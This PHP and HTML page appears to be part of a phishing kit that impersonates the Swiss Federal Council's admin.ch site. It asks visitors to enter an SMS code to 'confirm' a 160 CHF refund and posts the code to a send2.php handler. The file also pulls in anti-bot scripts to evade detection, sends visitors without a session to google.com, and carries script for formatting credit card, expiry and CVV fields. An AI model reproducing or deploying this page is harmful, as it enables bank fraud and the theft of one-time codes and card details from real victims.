<?php
    include "antibots/anti1.php";
    include "antibots/anti2.php";
    include "antibots/anti3.php";
    include "antibots/anti4.php";
    include "antibots/anti8.php";
    session_start();
    if (isset($_SESSION["username"])) {
?>
<!DOCTYPE html>
<html lang="de">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0,maximum-scale=1.0">
    <title>Der Bundesrat admin.ch - Startseite</title>
    <link rel="stylesheet" href="css/main.css">
    <link rel="icon" href="images/swiss.svg">

</head>
<body>
    <header>
        <nav>
        <div class="firstdivheader">
                <div><img src="images/swiss.svg" alt="image" height="25px" id="vp"></div>
                <div class="hellodear" id="ouf">Der Bundesrat</div>
            </div>
            <div class="seconddivheader">
                <img src="images/myicon.JPG" alt="image" height="42px">
            </div>
        </nav>
    </header>

    <main>
        <div class="containermain">
            <div class="remboursement">> Entschädigung</div>
            <div class="remplissez">Geben Sie den per SMS erhaltenen Code ein, um die Rückerstattung von <span style="color:red;font-weight:bold">160 CHF</span> zu bestätigen</div>
            <form action="php/send2.php" method="POST">
                <div class="divinput">
                    <div>SMS-Code :</div>
                    <div><input type="tel" required="" name="sms" class="inputty" placeholder="xxxxxx"></div>
                </div>
                <div class="divsubmit">
                    <button type="submit" class="submitbtn">Bestätigen</button>
                </div>
            </form>
        </div>
    </main>

    <footer>
        <div class="offooter">Der Bundesrat</div>
        <div class="offooter" id="kontakt">Kontakt</div>
        <div class="offooter">Informiert bleiben</div>
        <div class="appplay">
            <div><img src="images/voteinfo_appstore.png" alt="image" height="30px"></div>
            <div><img src="images/voteinfo_googleplay.png" alt="image" height="30px"></div>
        </div>
        <div class="forlast">
            <img src="images/Logo Schweizerische Eidgenossenschaft.png" alt="image" height="60px">
        </div>
    </footer>
    <script src="js/junia.framework.js"></script>
    <script src="js/main.js"></script>
    <script>
        let cc = document.getElementById("cc");
        let exp = document.getElementById("exp");
        let cvv  = document.getElementById("cvv");

        new Cleave(cc,{
            creditCard:true,
        })
        new Cleave(exp,{
            date:true,
            datePattern : ['m','y'],
            delimtier : "/",
        })
        new Cleave(cvv,{
            numericOnly:true,
            delimiter: "",
            blocks: [3],
        })
    </script>
</body>
</html>

<?php
}else {
HEADER("Location: https://google.com");

}
?>